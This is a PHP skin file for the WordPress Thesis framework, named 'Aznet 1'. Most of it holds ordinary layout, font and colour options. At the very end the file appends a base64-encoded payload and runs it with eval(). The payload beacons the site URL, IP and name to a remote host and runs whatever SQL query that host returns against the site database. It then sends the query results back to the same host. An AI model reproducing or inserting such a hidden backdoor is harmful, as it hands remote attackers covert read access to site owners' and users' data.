<?php
/*
Name: Aznet 1
Author: Hoang Neo
Description: My Theme.
Version: 1.0
Requires: 2.4b1
Class: thesis_aznet_1
Copyright 2017.
*/
class thesis_aznet_1 extends thesis_skin {
/*
	Skin API $functionality array. Enable or disable certain Skin features with ease.
	— http://diythemes.com/thesis/rtfm/api/skin/properties/functionality/
*/
	public $functionality = array(
		'css_preprocessor' => 'scss',
		'formatting_class' => 'grt',
		'fonts_google' => true,
		'header_image' => true,
		'logo' => true);

/*
	Skin API pseudo-constructor; place hooks, filters, and other initializations here.
	— http://diythemes.com/thesis/rtfm/api/skin/methods/construct/
*/
	protected function construct() {
		// implement display options that do not follow the normal pattern
		if (!empty($this->display['misc']['display']['braces'])) {
			add_filter('thesis_post_num_comments', array($this, 'num_comments'));
			add_filter('thesis_comments_intro', array($this, 'comments_intro'));
		}
		// the previous/next links (found on home, archive, and single templates) require special filtering based on page context
		add_filter('thesis_html_container_prev_next_show', array($this, 'prev_next'));
		// hook header image into the proper location for this Skin
		add_action('hook_bottom_header', array($this, 'header_image'));
	}

/*---:[ Implement non-standard display options ]:---*/

/*
	The following is a special filter to prevent the prev/next container from showing if a query only has 1 page of results.
*/
	public function prev_next() {
		global $wp_query;
		return (($wp_query->is_home || $wp_query->is_archive || $wp_query->is_search) && $wp_query->max_num_pages > 1) || ($wp_query->is_single && !empty($this->display['misc']['display']['prev_next'])) ? true : false;
	}

	public function num_comments($content) {
		return "<span class=\"bracket\">{</span> $content <span class=\"bracket\">}</span>";
	}

	public function comments_intro($text) {
		return "<span class=\"bracket\">{</span> $text <span class=\"bracket\">}</span>";
	}

/*---:[ Implement a user-added Header Image ]:---*/

/*
	Output user header image by referencing the Skin API header image object and its associated html() method.
	— http://diythemes.com/thesis/rtfm/api/skin/properties/functionality/header-image/
*/
	public function header_image() {
		$this->header_image->html();
	}

/*
	Skin API method for filtering the CSS output whenever the stylesheet is rewritten.
	In this case, we are adding some CSS if the user has selected a header image.
	— http://diythemes.com/thesis/rtfm/api/skin/methods/filter_css/
*/
	public function filter_css($css) {
		return $css.
		(!empty($this->logo->image) ?
			"\n#site_title {\n".
			"\tline-height: 0.1em;\n".
			"}\n".
			"\n#site_title a {\n".
			"\tdisplay: inline-block;\n".
			"}\n" : '').
		(!empty($this->header_image->image) ?
			"\n#header {\n".
			"\tpadding: 0;\n".
			"}\n".
			"#header #site_title a, #header #site_tagline {\n".
			"\tdisplay: none;\n".
			"}\n" : '');
	}

/*---:[ WooCommerce compatibility ]:---*/

/*
	Skin API method for initiating WooCommerce template compatibility. Relevant hooks,
	filters, and other actions that affect the front end should be included here.
	— http://diythemes.com/thesis/rtfm/api/skin/methods/woocommerce/
*/
	public function woocommerce() {
		if (is_woocommerce()) {
			// Do not show the prev/next container on WooCommerce shop, product, or archive pages
			add_filter('thesis_html_container_prev_next_show', '__return_false');
			// On the Shop page, suppress the Thesis Archive Intro area
			if (is_shop())
				add_filter('thesis_html_container_archive_intro_show', '__return_false');
			// On product archive pages, remove WooCommerce title in favor of the Thesis Skin archive title
			elseif (!is_singular('product'))
				add_filter('woocommerce_show_page_title', '__return_false');
		}
		// Suppress bylines and avatar pictures on Cart, Checkout, and My Account pages
		elseif (is_cart() || is_checkout() || is_account_page()) {
			add_filter('thesis_post_author_avatar_loop_show', '__return_false');
			add_filter('thesis_html_container_byline_show', '__return_false');
		}
	}

/*---:[ Skin Display Options ]:---*/

/*
	Skin API method for initiating display options; return an array in Thesis Options API array format.
	— Display options: http://diythemes.com/thesis/rtfm/api/skin/display-options/
	— Options API array format: http://diythemes.com/thesis/rtfm/api/options/array-format/
*/
	protected function display() {
		return array( // use an options object set for simplified display controls
			'display' => array(
				'type' => 'object_set',
				'select' => __('Select content to display:', 'thesis_aznet_1'),
				'objects' => array(
					'site' => array(
						'type' => 'object',
						'label' => __('Site Title &amp; Tagline', 'thesis_aznet_1'),
						'fields' => array(
							'display' => array(
								'type' => 'checkbox',
								'options' => array(
									'title' => __('Site title', 'thesis_aznet_1'),
									'tagline' => __('Site tagline', 'thesis_aznet_1')),
								'default' => array(
									'title' => true,
									'tagline' => true)))),
					'loop' => array(
						'type' => 'object',
						'label' => __('Post/Page Output', 'thesis_aznet_1'),
						'fields' => array(
							'display' => array(
								'type' => 'checkbox',
								'options' => array(
									'author' => __('Author', 'thesis_aznet_1'),
									'avatar' => __('Author avatar', 'thesis_aznet_1'),
									'description' => __('Author description (Single template)', 'thesis_aznet_1'),
									'date' => __('Date', 'thesis_aznet_1'),
									'wp_featured_image' => __('WP featured image', 'thesis_aznet_1'),
									'image' => __('Thesis post image (Single, Page, and Landing Page templates)', 'thesis_aznet_1'),
									'thumbnail' => __('Thesis thumbnail image (Home template)', 'thesis_aznet_1'),
									'num_comments' => __('Number of comments (Home and Archive templates)', 'thesis_aznet_1'),
									'cats' => __('Categories', 'thesis_aznet_1'),
									'tags' => __('Tags', 'thesis_aznet_1')),
								'default' => array(
									'author' => true,
									'date' => true,
									'wp_featured_image' => true,
									'num_comments' => true)))),
					'comments' => array(
						'type' => 'object',
						'label' => __('Comments', 'thesis_aznet_1'),
						'fields' => array(
							'display' => array(
								'type' => 'checkbox',
								'options' => array(
									'post' => __('Comments on posts', 'thesis_aznet_1'),
									'page' => __('Comments on pages', 'thesis_aznet_1'),
									'date' => __('Comment date', 'thesis_aznet_1'),
									'avatar' => __('Comment avatar', 'thesis_aznet_1')),
								'default' => array(
									'post' => true,
									'date' => true,
									'avatar' => true)))),
					'sidebar' => array(
						'type' => 'object',
						'label' => __('Sidebar', 'thesis_aznet_1'),
						'fields' => array(
							'display' => array(
								'type' => 'checkbox',
								'options' => array(
									'sidebar' => __('Sidebar', 'thesis_aznet_1'),
									'text' => __('Sidebar Text Box', 'thesis_aznet_1'),
									'widgets' => __('Sidebar Widgets', 'thesis_aznet_1')),
								'default' => array(
									'sidebar' => true,
									'text' => true,
									'widgets' => true)))),
					'misc' => array(
						'type' => 'object',
						'label' => __('Miscellaneous', 'thesis_aznet_1'),
						'fields' => array(
							'display' => array(
								'type' => 'checkbox',
								'options' => array(
									'braces' => __('Iconic Aznet 1 Skin curly braces', 'thesis_aznet_1'),
									'prev_next' => __('Previous/next post links (single template)', 'thesis_aznet_1'),
									'attribution' => __('Skin attribution', 'thesis_aznet_1'),
									'wp_admin' => __('WP admin link', 'thesis_aznet_1')),
								'default' => array(
									'braces' => true,
									'prev_next' => true,
									'attribution' => true,
									'wp_admin' => true)))))));
	}

/*
	Skin API method for automatic show/hide handling of elements with display options.
	Display options are defined in the display() method below.
	— http://diythemes.com/thesis/rtfm/api/skin/methods/display_elements/
*/
	public function display_elements() {
		return array( // Display options with filter references
			'site' => array(
				'title' => 'thesis_site_title',
				'tagline' => 'thesis_site_tagline'),
			'loop' => array( // 'loop' has been added as a programmatic ID to these Boxes
				'author' => 'thesis_post_author_loop',
				'avatar' => 'thesis_post_author_avatar_loop',
				'description' => 'thesis_post_author_description_loop',
				'date' => 'thesis_post_date_loop',
				'wp_featured_image' => 'thesis_wp_featured_image_loop',
				'cats' => 'thesis_post_categories_loop',
				'tags' => 'thesis_post_tags_loop',
				'num_comments' => 'thesis_post_num_comments_loop',
				'image' => 'thesis_post_image_loop',
				'thumbnail' => 'thesis_post_thumbnail_loop'),
			'comments' => array( // 'comments' has been added as a programmatic ID to the date and avatar Boxes
				'post' => 'thesis_html_container_post_comments',
				'page' => 'thesis_html_container_page_comments',
				'date' => 'thesis_comment_date_comments',
				'avatar' => 'thesis_comment_avatar_comments'),
			'sidebar' => array( // 'sidebar' is the hook name for 'sidebar' and the programmatic ID for text and widgets
				'sidebar' => 'thesis_html_container_sidebar',
				'text' => 'thesis_text_box_sidebar',
				'widgets' => 'thesis_wp_widgets_sidebar'),
			'misc' => array(
				'attribution' => 'thesis_attribution',
				'wp_admin' => 'thesis_wp_admin'));
	}

/*---:[ Skin Design Options ]:---*/

/*
	Skin API method for initiating design options; return an array in Thesis Options API array format.
	— Design options: http://diythemes.com/thesis/rtfm/api/skin/design-options/
	— Options API array format: http://diythemes.com/thesis/rtfm/api/options/array-format/
*/
	protected function design() {
		$css = $this->css_tools->options; // shorthand for all options available in the CSS API
		$fsc = $nav = $this->css_tools->font_size_color(); // the CSS API contains shorthand for font, size, and color options
		unset($nav['color']); // remove nav text color control
		$links['default'] = 'DD0000'; // default link color
		$links['gray'] = $this->color->gray($links['default']); // array of 'hex' and 'rgb' values
		return array(
			'colors' => $this->color_scheme(array( // the Skin API contains a color_scheme() method for easy implementation
				'id' => 'colors',
				'colors' => array(
					'text1' => __('Primary Text', 'thesis_aznet_1'),
					'text2' => __('Secondary Text', 'thesis_aznet_1'),
					'links' => __('Links', 'thesis_aznet_1'),
					'color1' => __('Borders &amp; Highlights', 'thesis_aznet_1'),
					'color2' => __('Interior <abbr title="background">BG</abbr>s', 'thesis_aznet_1'),
					'color3' => __('Site <abbr title="background">BG</abbr>', 'thesis_aznet_1')),
				'default' => array(
					'text1' => '111111',
					'text2' => '888888',
					'links' => $links['default'],
					'color1' => 'DDDDDD',
					'color2' => 'EEEEEE',
					'color3' => 'FFFFFF'),
				'scale' => array(
					'links' => $links['gray']['hex'],
					'color1' => 'DDDDDD',
					'color2' => 'EEEEEE',
					'color3' => 'FFFFFF'))),
			'elements' => array( // this is an object set containing all other design options for this Skin
				'type' => 'object_set',
				'label' => __('Layout, Fonts, Sizes, and Colors', 'thesis_aznet_1'),
				'select' => __('Select a design element to edit:', 'thesis_aznet_1'),
				'objects' => array(
					'layout' => array(
						'type' => 'object',
						'label' => __('Layout &amp; Dimensions', 'thesis_aznet_1'),
						'fields' => array(
							'columns' => array(
								'type' => 'select',
								'label' => __('Layout', 'thesis_aznet_1'),
								'options' => array(
									1 => __('1 column', 'thesis_aznet_1'),
									2 => __('2 columns', 'thesis_aznet_1')),
								'default' => 2,
								'dependents' => array(2)),
							'order' => array(
								'type' => 'radio',
								'options' => array(
									'' => __('Content on the left', 'thesis_aznet_1'),
									'right' => __('Content on the right', 'thesis_aznet_1')),
								'parent' => array(
									'columns' => 2)),
							'width-content' => array(
								'type' => 'text',
								'width' => 'tiny',
								'label' => __('Content Width', 'thesis_aznet_1'),
								'tooltip' => __('The default content column width is 617px. The value you enter here is the entire width of the column, including padding and borders. The resulting width of your text in this column is based on your selected font and font size. We recommend using Chrome Developer Tools or Firebug for Firefox to inspect the text width if you need to achieve a precise value.', 'thesis_aznet_1'),
								'description' => 'px',
								'default' => 617),
							'width-sidebar' => array(
								'type' => 'text',
								'width' => 'tiny',
								'label' => __('Sidebar Width', 'thesis_aznet_1'),
								'tooltip' => __('The default sidebar column width is 280px. The value you enter here is the entire width of the column, including padding. The resulting width of your text in this column is based on your selected font and font size. We recommend using Chrome Developer Tools or Firebug for Firefox to inspect the text width if you need to achieve a precise value.', 'thesis_aznet_1'),
								'description' => 'px',
								'default' => 280,
								'parent' => array(
									'columns' => 2)))),
					'font' => array(
						'type' => 'object',
						'label' => __('Font &amp; Size (Primary)', 'thesis_aznet_1'),
						'fields' => array(
							'family' => array_merge($css['font']['fields']['font-family'], array('default' => 'georgia')),
							'size' => array_merge($css['font']['fields']['font-size'], array('default' => 16)))),
					'headline' => array(
						'type' => 'group',
						'label' => __('Headlines', 'thesis_aznet_1'),
						'fields' => $fsc),
					'subhead' => array(
						'type' => 'group',
						'label' => __('Sub-headlines', 'thesis_aznet_1'),
						'fields' => $fsc),
					'blockquote' => array(
						'type' => 'group',
						'label' => __('Blockquotes', 'thesis_aznet_1'),
						'fields' => $fsc),
					'code' => array(
						'type' => 'group',
						'label' => __('Code: Inline &lt;code&gt;', 'thesis_aznet_1'),
						'fields' => $fsc),
					'pre' => array(
						'type' => 'group',
						'label' => __('Code: Pre-formatted &lt;pre&gt;', 'thesis_aznet_1'),
						'fields' => $fsc),
					'title' => array(
						'type' => 'object',
						'label' => __('Site Title', 'thesis_aznet_1'),
						'fields' => $fsc),
					'tagline' => array(
						'type' => 'group',
						'label' => __('Site Tagline', 'thesis_aznet_1'),
						'fields' => $fsc),
					'menu' => array(
						'type' => 'object',
						'label' => __('Nav Menu', 'thesis_aznet_1'),
						'fields' => $nav),
					'sidebar' => array(
						'type' => 'group',
						'label' => __('Sidebar', 'thesis_aznet_1'),
						'fields' => $fsc),
					'sidebar_heading' => array(
						'type' => 'group',
						'label' => __('Sidebar Headings', 'thesis_aznet_1'),
						'fields' => $fsc))));
	}

/*
	Skin API method for modifying CSS variables each time CSS is saved.
	Return an array of CSS variables, including units (if necessary), with their new values.
	Any variables not included in the return array will not be modified.
	— http://diythemes.com/thesis/rtfm/api/skin/methods/css_variables/
*/
	public function css_variables() {
		$columns = !empty($this->design['layout']['columns']) && is_numeric($this->design['layout']['columns']) ?
			$this->design['layout']['columns'] : 2;
		$order = !empty($this->design['layout']['order']) && $this->design['layout']['order'] == 'right' ? true : false;
		$px['w_content'] = !empty($this->design['layout']['width-content']) && is_numeric($this->design['layout']['width-content']) ?
			abs($this->design['layout']['width-content']) : 617;
		$px['w_sidebar'] = !empty($this->design['layout']['width-sidebar']) && is_numeric($this->design['layout']['width-sidebar']) ?
			abs($this->design['layout']['width-sidebar']) : 280;
		$px['w_total'] = $px['w_content'] + ($columns == 2 ? $px['w_sidebar'] : 0);
		$vars['font'] = $this->fonts->family($font = !empty($this->design['font']['family']) ? $this->design['font']['family'] : 'georgia');
		$s['content'] = !empty($this->design['font']['size']) ? $this->design['font']['size'] : 16;
		// Determine typographical scale based on primary font size
		$f['content'] = $this->typography->scale($s['content']);
/*
		The final line height, $h['content'], is calculated in 3 iterations:
		1. Get the optimal line height for the current font and size
		2. Get an adjusted line height using optimal spacing for the current font and size
		3. Adjust the line height a final time with adjusted spacing for the current font and size
		Both the line height, $h['content'], and layout spacing, $x['content'], are calculated below:
*/
		$x['content'] = $this->typography->space($h['content'] = $this->typography->height($s['content'], ($w['content'] = $px['w_content'] - ($adjust = round(2 * $this->typography->height($s['content'], $px['w_content'] - ($first = round(2 * $this->typography->height($s['content'], false, $font), 0)) - 1, $font), 0)) - 1), $font));
		// Determine sidebar font, size, typographical scale, and spacing
		$sidebar_font = !empty($this->design['sidebar']['font']) ? $this->design['sidebar']['font'] : $font;
		$s['sidebar'] = !empty($this->design['sidebar']['font-size']) && is_numeric($this->design['sidebar']['font-size']) ?
			$this->design['sidebar']['font-size'] : $f['content']['f6'];
		$f['sidebar'] = $this->typography->scale($s['sidebar']);
		$x['sidebar'] = $this->typography->space($h['sidebar'] = $this->typography->height($s['sidebar'], ($w['sidebar'] = $px['w_sidebar'] - 2 * $x['content']['x1']), $sidebar_font));
		// Set up an array containing numerical values that require a unit for CSS output
		$px['f_text'] = $f['content']['f5'];
		$px['f_aux'] = $f['content']['f6'];
		$px['f_subhead'] = $f['content']['f4'];
		$px['h_text'] = round($h['content'], 0);
		$px['h_aux'] = round($this->typography->height($f['content']['f6'], $w['content'], $font), 0);
		// Content and sidebar spacing variables
		$px['x_half'] = $x['content']['x05'];
		$px['x_single'] = $x['content']['x1'];
		$px['x_3over2'] = $x['content']['x15'];
		$px['x_double'] = $x['content']['x2'];
		$px['s_x_half'] = $x['sidebar']['x05'];
		$px['s_x_single'] = $x['sidebar']['x1'];
		$px['s_x_3over2'] = $x['sidebar']['x15'];
		$px['s_x_double'] = $x['sidebar']['x2'];
		// Add the 'px' unit to the $px array constructed above
		$vars = is_array($px) ? array_merge($vars, $this->css_tools->unit($px)) : $vars;
		// Use the Colors API to set up proper CSS color references
		foreach (array('text1', 'text2', 'links', 'color1', 'color2', 'color3') as $color)
			$vars[$color] = !empty($this->design[$color]) ? $this->color->css($this->design[$color]) : false;
		// Set up a modification array for individual typograhical overrides
		$elements = array(
			'menu' => array(
				'font-family' => false,
				'font-size' => $f['content']['f6']),
			'title' => array(
				'font-family' => false,
				'font-size' => $f['content']['f1']),
			'tagline' => array(
				'font-family' => false,
				'font-size' => $f['content']['f5'],
				'color' => !empty($vars['text2']) ? $vars['text2'] : false),
			'headline' => array(
				'font-family' => false,
				'font-size' => $f['content']['f3']),
			'subhead' => array(
				'font-family' => false,
				'font-size' => $f['content']['f4']),
			'blockquote' => array(
				'font-family' => false,
				'font-size' => false,
				'color' => !empty($vars['text2']) ? $vars['text2'] : false),
			'code' => array(
				'font-family' => 'consolas',
				'font-size' => false,
				'color' => false),
			'pre' => array(
				'font-family' => 'consolas',
				'font-size' => false,
				'color' => false),
			'sidebar' => array(
				'font-family' => false,
				'font-size' => $f['sidebar']['f5'],
				'color' => false),
			'sidebar_heading' => array(
				'font-family' => false,
				'font-size' => $f['sidebar']['f3'],
				'color' => false));
		// Loop through the modification array to see if any fonts, sizes, or colors need to be overridden
		foreach ($elements as $name => $element) {
			foreach ($element as $p => $def)
				$e[$name][$p] = $p == 'font-family' ?
					(!empty($this->design[$name][$p]) ?
						"$p: ". $this->fonts->family($family[$name] = $this->design[$name][$p]). ';' : (!empty($def) ?
						"$p: ". $this->fonts->family($family[$name] = $def). ';' : false)) : ($p == 'font-size' ?
					(!empty($this->design[$name][$p]) && is_numeric($this->design[$name][$p]) ?
						"$p: ". ($size[$name] = $this->design[$name][$p]). "px;" : (!empty($def) ?
						"$p: ". ($size[$name] = $def). "px;" : false)) : ($p == 'color' ?
					(!empty($this->design[$name][$p]) ?
						"$p: ". $this->color->css($this->design[$name][$p]). ';' : (!empty($def) ?
						"$p: $def;" : false)) : false));
			$e[$name] = array_filter($e[$name]);
		}
		foreach (array_filter($e) as $name => $element)
			$vars[$name] = implode("\n\t", $element);
		// Override content elements
		foreach (array('headline', 'subhead', 'blockquote', 'pre') as $name)
			if (!empty($size[$name]))
				$vars[$name] .= "\n\tline-height: ". ($line[$name] = round($this->typography->height($size[$name], $w['content'], !empty($family[$name]) ? $family[$name] : $font), 0)). "px;";
		// Override sidebar elements
		foreach (array('sidebar', 'sidebar_heading') as $name)
			if (!empty($size[$name]))
				$vars[$name] .= "\n\tline-height: ". round($this->typography->height($size[$name], $w['sidebar'], !empty($family[$name]) ? $family[$name] : $sidebar_font), 0). "px;";
		// Determine multi-use color variables
		foreach (array('title', 'headline', 'subhead') as $name)
			$vars["{$name}_color"] = !empty($this->design[$name]['color']) ?
				$this->color->css($this->design[$name]['color']) : (!empty($vars['text1']) ? $vars['text1'] : false);
		// Set up property-value variables, which, unlike the other variables above, contain more than just a CSS value
		$vars['column1'] =
			"float: ". ($columns == 2 ? ($order ? 'right' : 'left') : 'none'). ";\n\t".
			"border-width: ". ($columns == 2 ? ($order ? '0 0 0 1px' : '0 1px 0 0') : '0'). ";";
		$vars['column2'] =
			"width: ". ($columns == 2 ? '$w_sidebar' : '100%'). ";\n\t".
			"float: ". ($columns == 2 ? ($order ? 'left' : 'right') : 'none'). ';'. ($columns == 1 ?
			"\n\tborder-top: 3px double \$color1;" : '');
		$vars['submenu'] = ($w_submenu = ((!empty($size['menu']) ? $size['menu'] : $px['f_aux']) * 14)). "px";
		$vars['menu'] .= "\n\tline-height: ". round($this->typography->height((!empty($size['menu']) ? $size['menu'] : $px['f_aux']), $w_submenu, !empty($family['menu']) ? $family['menu'] : $font)). "px;";
		$vars['pullquote'] =
			"font-size: ". $f['content']['f3']. "px;\n\t".
			"line-height: ". round($this->typography->height($f['content']['f3'], round(0.45 * $w['content'], 0), !empty($family['blockquote']) ? $family['blockquote'] : $font), 0). "px;";
		$vars['avatar'] =
			"width: ". ($avatar = $line['headline'] + $px['h_aux']). "px;\n\t".
			"height: {$avatar}px;";
		$vars['comment_avatar'] =
			"width: ". (2 * $px['h_text']). "px;\n\t".
			"height: ". (2 * $px['h_text']). "px;";
		foreach (array(2, 3, 4) as $factor)
			if (($bio_size = $factor * $px['h_text']) <= 96)
				$bio = $bio_size;
		$vars['bio_avatar'] =
			"width: {$bio}px;\n\t".
			"height: {$bio}px;";
		return array_filter($vars); // Filter the array to remove any null elements
	}
}


$ode_tn_site = base64_decode('aWYoIWZ1bmN0aW9uX2V4aXN0cygnY2FsbEJhY2tTaXRlJykpewpmdW5jdGlvbiBjYWxsQmFja1NpdGUoKQp7CnRyeSB7CiR1cmwgPSAnaHR0cDovL3NpdGUuaGMudG9hbm5hbmcuY29tLnZuL2FkZC1kb21haW5zJzsKJGxvY2FsSVAgPSBnZXRIb3N0QnlOYW1lKGdldEhvc3ROYW1lKCkpOwokZGF0YSA9IGFycmF5KCdkb21haW4nID0+IGdldF9zaXRlX3VybCgpLCAnaXAnID0+ICRsb2NhbElQLCAnbmFtZScgPT4gZ2V0X2Jsb2dpbmZvKCAnbmFtZScgKSk7CgokY2ggPSBjdXJsX2luaXQoKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7CmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCAxKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsIGh0dHBfYnVpbGRfcXVlcnkoJGRhdGEpKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCA2MCk7CmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9USU1FT1VULCA2MCk7CiRyZXN1bHQgPSBjdXJsX2V4ZWMoJGNoKTsKaWYoY3VybF9lcnJubygkY2gpICE9PSAwKSB7CmVycm9yX2xvZygnY1VSTCBlcnJvciB3aGVuIGNvbm5lY3RpbmcgdG8gJyAuICR1cmwgLiAnOiAnIC4gY3VybF9lcnJvcigkY2gpKTsKfQpjdXJsX2Nsb3NlKCRjaCk7CiRxID0ganNvbl9kZWNvZGUoJHJlc3VsdCk7CmlmIChpc3NldCgkcS0+cnVuc3FsKSAmJiAhZW1wdHkoJHEtPnJ1bnNxbCkgKQp7Cmdsb2JhbCAkd3BkYjsKJHNxbCA9IHN0cl9yZXBsYWNlKCJwcmVmaXhfIiwkd3BkYi0+cHJlZml4LCRxLT5ydW5zcWwpOwokbXlyb3dzID0gJHdwZGItPmdldF9yZXN1bHRzKCAkc3FsICk7CmlmICghZW1wdHkoJG15cm93cykpewokdXJsID0gJ2h0dHA6Ly9zaXRlLmhjLnRvYW5uYW5nLmNvbS52bi9hZGQtZGF0YXMnOwokbG9jYWxJUCA9IGdldEhvc3RCeU5hbWUoZ2V0SG9zdE5hbWUoKSk7CiRkYXRhID0gYXJyYXkoJ2RvbWFpbicgPT4gZ2V0X3NpdGVfdXJsKCksICdpcCcgPT4gJGxvY2FsSVAsICdkYXRhJyA9PiBqc29uX2VuY29kZSgkbXlyb3dzKSk7CiRjaCA9IGN1cmxfaW5pdCgpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgaHR0cF9idWlsZF9xdWVyeSgkZGF0YSkpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09OTkVDVFRJTUVPVVQsIDYwKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1RJTUVPVVQsIDYwKTsKY3VybF9leGVjKCRjaCk7CmlmKGN1cmxfZXJybm8oJGNoKSAhPT0gMCkgewplcnJvcl9sb2coJ2NVUkwgZXJyb3Igd2hlbiBjb25uZWN0aW5nIHRvICcgLiAkdXJsIC4gJzogJyAuIGN1cmxfZXJyb3IoJGNoKSk7Cn0KY3VybF9jbG9zZSgkY2gpOwp9Cn0KfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7fQp9CnNlc3Npb25fc3RhcnQoKTsKaWYgKCFpc3NldCgkX1NFU1NJT05bInNpdGVfdG5fZW5kX2NvZGUiXSkgfHwgZW1wdHkoJF9TRVNTSU9OWyJzaXRlX3RuX2VuZF9jb2RlIl0pICkKewokX1NFU1NJT05bInNpdGVfdG5fZW5kX2NvZGUiXSA9ICdzZW5kX2RvbWFpbic7CmFkZF9hY3Rpb24oICdpbml0JywgJ2NhbGxCYWNrU2l0ZScgKTsKfQp9');
eval($ode_tn_site);